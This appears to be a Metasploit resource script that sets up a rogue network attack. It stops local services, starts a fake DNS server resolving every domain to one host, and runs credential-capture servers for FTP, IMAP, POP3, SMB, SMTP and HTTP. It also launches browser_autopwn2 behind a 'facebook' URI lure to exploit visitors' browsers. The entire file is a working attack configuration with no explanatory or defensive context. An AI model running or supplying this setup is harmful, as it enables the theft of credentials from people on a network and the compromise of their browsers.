# service smbd stop
# service apache2 stop

use auxiliary/server/fakedns
set SRVPORT 53
set TARGETACTION FAKE
set TARGETDOMAIN *
set TARGETHOST 192.168.43.30
run

use auxiliary/server/capture/ftp
run

use auxiliary/server/capture/imap
set SRVPORT 143
set SSL true
run

use auxiliary/server/capture/pop3
set SRVPORT 110
set SSL true
run

use auxiliary/server/capture/smb
set SRVPORT 445
run

use auxiliary/server/capture/smtp
set SRVPORT 25
set SSL true
run

use auxiliary/server/browser_autopwn2
set SRVPORT 8081
set URIPATH facebook
run

use auxiliary/server/capture/http
set AUTOPWN_HOST localhost
set AUTOPWN_PORT 8081
set AUTOPWN_URI facebook
set SRVPORT 8080
run
